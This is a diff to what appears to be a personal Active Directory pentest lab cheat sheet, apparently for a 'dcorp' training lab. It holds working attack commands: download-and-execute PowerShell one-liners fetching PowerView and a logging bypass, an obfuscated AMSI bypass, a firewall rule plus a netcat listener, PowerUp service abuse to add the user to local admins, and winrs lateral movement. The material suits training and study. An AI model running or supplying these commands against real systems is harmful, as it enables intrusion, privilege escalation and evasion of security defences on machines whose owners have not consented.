@@ -22,6 +22,33 @@ iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps
 iex (iwr http://10.0.10.16/sbloggingbypass.txt-UseBasicParsing)
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
+
+# Enable inbound traffic
+C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
+. C:\AD\Tools\PowerUp.ps1
+New-NetFirewallRule -DisplayName "Allow Inbound Traffic" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8001
+C:\AD\Tools\netcat-win32-1.12\nc64.exe -lnvp 8001
+
+```
+
+# Priv Esc
+```powershell
+# List examples of how to abuse a service
+help Invoke-ServiceAbuse -Examples
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose  #Adding the current user to the admin group. you need to logoff then logon again inorder to make it working
+```
+
+# Finding local admin access
+```powershell
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess
+
+#you can connect to the other computer using the following command
+winrs -r:dcorp-adminsrv cmd
+set username
+set computername
+
+
 ```
 
 # Lateral Movement 
